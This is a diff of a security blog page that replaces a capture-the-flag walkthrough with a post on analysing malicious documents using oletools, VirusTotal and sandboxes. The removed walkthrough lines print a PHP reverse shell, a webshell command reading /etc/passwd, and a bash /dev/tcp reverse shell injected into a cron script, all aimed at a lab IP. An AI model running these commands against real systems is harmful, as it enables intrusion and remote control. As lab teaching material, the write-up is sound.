@@ -183,6 +183,12 @@
         .blog li {
             color: #fff;
         }
+        
+        .blog img {
+            width: 100%;
+            margin-top: 20px;
+            margin-bottom: 30px;
+        }
 
         .screenshot {
             text-align: center;
@@ -239,9 +245,11 @@
 
     <article class="blog">
         <div class="caption">
-            <time datetime="2023-03-13">Tuesday, April 11, 2023</time>
+            <time datetime="2023-04-11">Tuesday, April 11, 2023</time>
             <h1>Malicious Document Analysis</h1>
         </div>
+
+        <img src="Images/Malicious-document-analysis.png" alt="Malicious-document-analysis">
     
         <div class="content">
             <p>
@@ -293,189 +301,70 @@
                 </code></pre>
             </div>
 
-
-            <div class="screenshot">
-                <img src="Images/services.png" alt="nmap result">
-                <p>Figure 2 - Running services </p>
-            </div>
-
-            <h2>Enumerate Web Application and ftp</h2>
+            <h4>Oletools</h4>
             <p>
-                From the reconnaissance, we have identified that the target is running an ftp server and web application.
-                We can probe the FTP server to see what's on it. We can log in anonymously as anonymous login is allowed on the FTP server. 
-                From our Nmap scan, we also noticed a file called "note.txt" on the FTP server. We can log in and download the file to our local machine to view its content as follows:
+                <a href="https://github.com/decalage2/oletools">Oletools</a> is a suite of tools designed specifically for analyzing malicious documents. It includes tools like oledump, olevba, rtfdump, and olebrowse, each of which has specific capabilities for analyzing different types of malicious files. To install Oletools, use the following command:
             </p>
             <div class="code-snippet">
                 <div class="copy-code">&#x1F4CB;</div>
-                <pre><code class="language-bash" data-clipboard-text='ftp 192.168.1.211
-                    get note.txt'>
-                    ftp 192.168.1.211
-                    get note.txt
-                </code></pre>
-            </div>
-
-            <div class="screenshot">
-                <img src="Images/ftp_1.png" alt="nmap result">
-                <p>Figure 3 - ftp login </p>
-            </div>
-            <div class="screenshot">
-                <img src="Images/ftp_get.png" alt="nmap result">
-                <p>Figure 4 - ftp login </p>
-            </div>
-
-            <div class="screenshot">
-                <img src="Images/note.png" alt="nmap result">
-                <p>Figure 5 - note.txt content </p>
-            </div>
-
-            <p>
-                In the content of the note.txt file, we find a hashed password. We can crack the hashed password with hashcat 
-                or online tool like <a href="https://hashes.com/en/decrypt/hash" target="_blank" rel="noopener noreferrer">Hashes</a>. 
-                When cracking with hashcat, we need to know the hash type of 
-                <code>cd73502828457d15655bbd7a63fb0bc8</code>, which we determine to be MD5 by checking online.
-                The cracked hash result in student, so we now have <code>login: 10201321</code> and <code>password: student</code>.
-            </p>
-
-            <div class="code-snippet">
-                <div class="copy-code">&#x1F4CB;</div>
-                <pre><code class="language-bash" data-clipboard-text='hashcat -a 0  -m 0 hash.txt /usr/share/wordlists/rockyou.txt'>
-                    hashcat -a 0  -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+                <pre><code class="language-bash" data-clipboard-text='sudo -H pip install -U oletools'>
+                    sudo -H pip install -U oletools
                 </code></pre>
             </div>
 
             <p>
-                We need to identify the URL of the login page for the web application and any other pages that may be useful for our attack. 
-                We can use tools such as Dirb or Gobuster to enumerate the web application:
+                Once you have oletools installed, you may proceed to use the suite:
             </p>
+
+            <h4>Using Olemeta</h4>
             <div class="code-snippet">
                 <div class="copy-code">&#x1F4CB;</div>
-                <pre><code class="language-bash" data-clipboard-text='gobuster dir -u http://192.168.1.211/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt'>
-                gobuster dir -u http://192.168.1.211/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+                <pre><code class="language-bash" data-clipboard-text='olemeta malicious_document_name.docx'>
+                    olemeta malicious_document_name.docx
                 </code></pre>
             </div>
 
-            <div class="screenshot">
-                <img src="Images/gobuster.png" alt="nmap result">
-                <p>Figure 6 - Gobuster </p>
-            </div>
-
-            <p>
-                We can now log into http://192.168.1.211/academy/ since we have the login from our prior exploit. 
-                Yes we are now in the web application and can exploit it's features. We can see the choice to browse 
-                and upload a new photo when we look through the web app's features. Seeing that the system was a php one, 
-                we could upload a php backdoor file to enable us get command line access. 
-            </p>
-
-            <div class="screenshot">
-                <img src="Images/profile.png" alt="nmap result">
-                <p>Figure 7 - Profile upload </p>
-            </div>
-
-            <div class="screenshot">
-                <img src="Images/backdoor.png" alt="nmap result">
-                <p>Figure 8 - Backdoor </p>
-            </div>
-            
-            <p>
-                By inspecting the page after the upload, we could see the path to the file is <code>studentphoto/user7.php</code>.
-                Since our backdoor is in there, then I proceeded to use that to view sensitive files. At the time on uploading my backdoor, 
-                this is the list that I got. The command used: <code>http://192.168.1.211/academy/studentphoto/user7.php?cmd=ls</code>. 
-                I also got to view the passwd file to know which users are present on the system for escalation. 
-                This is how the modification of the url looks like: <code>http://192.168.1.211/academy/studentphoto/user7.php?cmd=cat%20/etc/passwd</code>.
-            </p>
-
-            <div class="screenshot">
-                <img src="Images/passwd.png" alt="nmap result">
-                <p>Figure 9 - Passwd file </p>
-            </div>
-    
-            <h2>Horizontal Escalation</h2>
-            <p>
-                Seeing that our backdoor is working fine, we can proceed craft a payload to help get a reverse shell for further privilege escalation:
-            </p>
-
+            <h4>Using Oleid</h4>
             <div class="code-snippet">
                 <div class="copy-code">&#x1F4CB;</div>
-                <pre><code class="language-bash" data-clipboard-text=' '>
-                    php -r '$sock=fsockopen("192.168.1.7",6996);$proc=proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);' 
+                <pre><code class="language-bash" data-clipboard-text='oleid malicious_document_name.docx'>
+                    oleid malicious_document_name.docx
                 </code></pre>
             </div>
 
-            <p>
-                We can then listen for the shell in a different terminal with the command:
-            </p>
+            <h4>Using olevba</h4>
             <div class="code-snippet">
                 <div class="copy-code">&#x1F4CB;</div>
-                <pre><code class="language-bash" data-clipboard-text='nc -nlvp 6996'>
-                    nc -nlvp 6996 
+                <pre><code class="language-bash" data-clipboard-text='olevba malicious_document_name.docx'>
+                    olevba malicious_document_name.docx
                 </code></pre>
             </div>
-            
+
+            <h4>Virustotal</h4>
             <p>
-                Even though we are not seeing the shell prompt, we could see the banner which makes us know that we are connected.
+                <a href="https://www.virustotal.com">VirusTotal</a>
+                is a powerful online tool that can be used to analyze suspicious documents for potential malware. The platform offers a simple way to check files against multiple anti-virus engines, providing a comprehensive view of any known malware signatures associated with the file.
+            </p>
+            <p>
+                To use VirusTotal, simply upload the suspicious document to the website, and wait for the analysis to complete. The website will then display a report that includes the results of the scan, as well as any additional information, such as the type of document, any embedded objects, and any URLs or domains associated with the file.
             </p>
 
-            <div class="screenshot">
-                <img src="Images/shell.png" alt="nmap result">
-                <p>Figure 10 - Reverse shell </p>
-            </div>
-
+            <h4>Sandboxing</h4>
             <p>
-                While exploring user www-data, when we navigate to the user's <code>/</code> directory, we can find another home directory which contained 
-                another directory for the user grimmie which was seen in /etc/passwd file as shown in Figure 9. 
-                In this directory, we will find a backup.sh file which has quite some information pointing to something important. 
-                When we navigate to the path provided in backup.sh, we will find some sensitive information in the config.php file. 
+                Sandboxing is an important technique for analyzing malicious documents. Sandboxing allows you to run a suspicious document in an isolated environment, which helps prevent any potential damage to your system. This approach can help you identify any malicious behavior or activities that the document might carry out. In a sandboxed environment, you can monitor the document's behavior, such as any changes to the file system, registry, network connections, or processes that are spawned.
             </p>
-
-            <div class="screenshot">
-                <img src="Images/backup.png" alt="nmap result">
-                <p>Figure 11 - Backup content </p>
-            </div>
-
-            <div class="screenshot">
-                <img src="Images/config.png" alt="nmap result">
-                <p>Figure 12 - Config file </p>
-            </div>
-
             <p>
-                Having obtained the credentials for user grimmie, we can switch user and try to escalate to get access to the flag.
-                The system doesn't seem to have much options that we may take advantage of but good enough there's the possiblity to 
-                use crontab. Crontab can be viewed with the command <code>cat /etc/crontab</code>.
+                There are several open-source and commercial sandboxing solutions available, such as 
+                <a href="https://cuckoosandbox.org/">Cuckoo Sandbox</a>, 
+                <a href="https://any.run/">Any.Run</a>, 
+                <a href="https://www.hybrid-analysis.com/">hybrid-analysis</a> etc. 
+                These solutions offer various features, such as malware detection, dynamic analysis, and behavioral analysis, and can help identify the potential threats associated with a malicious document.
             </p>
-
-            <div class="screenshot">
-                <img src="Images/crontab.png" alt="nmap result">
-                <p>Figure 13 - Crontab</p>
-            </div>
-
-            <p>
-                Haven seee the content of backup.sh, we can use bash tcp reverse shell to get privilege escalation.
-                We will <code>echo bash -i >& /dev/tcp/192.168.1.7/8081 0>&1 >> /home/grimmie/backup.sh</code> and 
-                listen on a different terminal with <code>nc -nlvp 8081</code>. After echoing into backup.sh file, 
-                we can run <code>./backup.sh</code>
-            </p>
-
-            <div class="screenshot">
-                <img src="Images/bash.png" alt="nmap result">
-                <p>Figure 14 - bash</p>
-            </div>
-
-            <div class="screenshot">
-                <img src="Images/flag.png" alt="nmap result">
-                <p>Figure 15 - Flag</p>
-            </div>
-
-            <p>Flag: <code>Congratz you rooted this box!</code></p>
-            
 
             <h2>Conclusion</h2>
             
             <p>
-                Privilege escalation is a serious threat to the security of a Linux system. It can be achieved through a variety of methods, 
-                including exploiting vulnerabilities, using brute-force attacks, and exploiting misconfigured permissions. 
-                To prevent privilege escalation, it is important to implement strong security measures, such as using strong passwords, keeping 
-                the system up-to-date with the latest security patches, and monitoring the system for suspicious activity. By following these best practices, 
-                you can help to protect your Linux system from the threat of privilege escalation.
+                Analyzing malicious documents is an important part of cybersecurity. By using the right tools and techniques, you can identify and prevent potential threats before they can cause harm. Whether you're a security analyst or just someone who wants to stay safe online, understanding the process of malicious document analysis is an essential skill.
             </p>
 
         </div>
